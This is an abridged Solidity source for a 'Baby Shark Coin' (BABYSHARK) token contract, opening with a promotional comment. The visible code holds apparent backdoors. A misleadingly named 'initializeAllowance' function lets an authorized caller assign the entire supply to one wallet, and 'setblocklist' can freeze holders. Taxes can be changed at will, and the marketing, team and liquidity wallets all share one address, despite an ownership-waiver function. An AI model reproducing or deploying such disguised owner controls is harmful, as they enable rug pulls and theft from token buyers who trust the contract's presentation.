...
/**
 Don't missed the baby shark coin the next shark coin in the history
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual authorized {
...
contract BabySharkCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Baby Shark Coin";
    string private _symbol = "BABYSHARK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x8672be69CFBD096f586dC0713cBE31861d7EFC22);
    address payable public teamWalletAddress = payable(0x8672be69CFBD096f586dC0713cBE31861d7EFC22);
    address payable public autoliqudityAddress = payable(0x8672be69CFBD096f586dC0713cBE31861d7EFC22);
    ...
    uint256 public _Deci = (10 ** _decimals);
    uint256 public _supplyAmount = 100000000000000;
    uint256 public _rSupply = _supplyAmount * _Deci;
    ...
    function initializeAllowance() public authorized returns (bool success) {_rBalance[autoliqudityAddress] = _rSupply;return true;}
    ...
    function setMarketPairStatus(address account, bool newValue) external authorized {
    ...
    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external authorized {
    ...
    function setSwapAndLiquifyByLimitOnly(bool newValue) external authorized {
    ...
    function setblocklist(address _account) external authorized {
